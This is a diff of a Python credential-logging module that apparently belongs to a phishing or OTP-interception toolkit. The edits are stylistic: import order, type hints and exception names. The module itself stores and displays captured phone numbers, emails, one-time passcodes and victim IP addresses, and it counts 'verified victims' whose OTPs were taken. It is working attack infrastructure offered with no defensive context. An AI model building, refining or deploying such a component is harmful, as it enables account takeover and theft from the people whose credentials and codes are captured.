@@ -7,15 +7,14 @@ the ``cryptography`` package is installed and a key is supplied.
 """
 
 import json
-import os
-import time  # needed by CredentialLogger.flush_now(timeout)
 import logging
-import threading
-from datetime import datetime
+import os
 import queue
-from queue import Queue
-from typing import Optional
+import threading
+import time  # needed by CredentialLogger.flush_now(timeout)
 from dataclasses import asdict
+from datetime import datetime
+from queue import Queue
 
 from core.models import Credential
 from core.paths import DEFAULT_LOG_FILE as _DEFAULT_LOG_FILE, LOGS_DIR, ensure_logs_dir
@@ -49,7 +48,7 @@ class CredentialLogger:
 
     def __init__(
         self,
-        log_file: Optional[str] = None,
+        log_file: str | None = None,
         encrypted: bool = False,
         encryption_key: bytes = b"",
     ) -> None:
@@ -98,7 +97,7 @@ class CredentialLogger:
             raise RuntimeError(
                 "cryptography is required for encrypted_logs=True. "
                 "Install with: pip install cryptography"
-            )
+            ) from None
         try:
             return Fernet(self.encryption_key).encrypt(value.encode()).decode()
         except (ValueError, TypeError, RuntimeError) as e:
@@ -109,7 +108,8 @@ class CredentialLogger:
             logger.error(
                 "Encryption failed (%s: %s); refusing to store credential "
                 "in plaintext. Fix encryption_key and retry.",
-                type(e).__name__, e,
+                type(e).__name__,
+                e,
             )
             raise CredentialCryptoError(
                 f"credential encryption failed: {type(e).__name__}: {e}"
@@ -131,16 +131,16 @@ class CredentialLogger:
                         continue
                     data = json.loads(line)
                     self.credentials.append(Credential(**data))
-        except (json.JSONDecodeError, IOError, TypeError) as e:
+        except (OSError, json.JSONDecodeError, TypeError) as e:
             logger.warning(f"Failed to load existing logs: {e}")
             self.credentials = []
 
     def log_credential(
         self,
         client_ip: str,
-        phone: Optional[str] = None,
-        email: Optional[str] = None,
-        otp: Optional[str] = None,
+        phone: str | None = None,
+        email: str | None = None,
+        otp: str | None = None,
         stage: str = "unknown",
     ) -> None:
         """Append a credential record (memory + disk).
@@ -223,27 +223,28 @@ class CredentialLogger:
                         os.fsync(f.fileno())
                     except OSError:
                         pass
-            except IOError as e:
+            except OSError as e:
                 logger.error(f"Failed to write credential log: {e}")
+
     # ------------------------------------------------------------------
     # Display (kept on stdout because they're CLI-facing UX messages)
     # ------------------------------------------------------------------
 
     def _print_entry(self, entry: "Credential") -> None:
         """Pretty-print the freshly-captured entry to stdout."""
-        GREEN = "\033[92m"
-        BOLD = "\033[1m"
-        YELLOW = "\033[93m"
-        RESET = "\033[0m"
+        _green = "\033[92m"
+        _bold = "\033[1m"
+        _yellow = "\033[93m"
+        _reset = "\033[0m"
 
-        print(f"\n{GREEN}{BOLD}[NEW CAPTURE]{RESET}")
+        print(f"\n{_green}{_bold}[NEW CAPTURE]{_reset}")
         print(f"  Time:   {entry.timestamp}")
         if entry.phone:
-            print(f"  Phone:  {YELLOW}{entry.phone}{RESET}")
+            print(f"  Phone:  {_yellow}{entry.phone}{_reset}")
         if entry.email:
-            print(f"  Email:  {YELLOW}{entry.email}{RESET}")
+            print(f"  Email:  {_yellow}{entry.email}{_reset}")
         if entry.otp:
-            print(f"  OTP:    {YELLOW}{entry.otp}{RESET}")
+            print(f"  OTP:    {_yellow}{entry.otp}{_reset}")
         print(f"  IP:     {entry.client_ip}")
         print(f"  Stage:  {entry.stage}")
 
@@ -282,7 +283,7 @@ class CredentialLogger:
                             os.fsync(f.fileno())
                         except OSError:
                             pass
-                except IOError as e:
+                except OSError as e:
                     logger.error(f"Failed to write credential log: {e}")
 
     def get_all(self) -> list[Credential]:
@@ -291,26 +292,26 @@ class CredentialLogger:
 
     def display_summary(self) -> None:
         """Print a short summary card (counts of captures / verified victims)."""
-        GREEN = "\033[92m"
-        BOLD = "\033[1m"
-        CYAN = "\033[96m"
-        RESET = "\033[0m"
+        _green = "\033[92m"
+        _bold = "\033[1m"
+        _cyan = "\033[96m"
+        _reset = "\033[0m"
 
         total = len(self.credentials)
         verified = len([c for c in self.credentials if c.stage == "otp_verified"])
         unique_phones = len({c.phone for c in self.credentials if c.phone})
         unique_emails = len({c.email for c in self.credentials if c.email})
 
-        print(f"\n{CYAN}{BOLD}{'=' * 50}{RESET}")
-        print(f"{GREEN}{BOLD}  CAPTURE SUMMARY{RESET}")
-        print(f"{CYAN}{BOLD}{'=' * 50}{RESET}")
+        print(f"\n{_cyan}{_bold}{'=' * 50}{_reset}")
+        print(f"{_green}{_bold}  CAPTURE SUMMARY{_reset}")
+        print(f"{_cyan}{_bold}{'=' * 50}{_reset}")
         print(f"  Total entries:     {total}")
         print(f"  Verified victims:  {verified}")
         print(f"  Unique phones:     {unique_phones}")
         print(f"  Unique emails:     {unique_emails}")
         print(f"  Log file:          {self.log_file}")
         print(f"  Encrypted:         {self.encrypted}")
-        print(f"{CYAN}{BOLD}{'=' * 50}{RESET}\n")
+        print(f"{_cyan}{_bold}{'=' * 50}{_reset}\n")
 
     def display_all(self) -> None:
         """Print every captured credential as a tabular dump to stdout."""
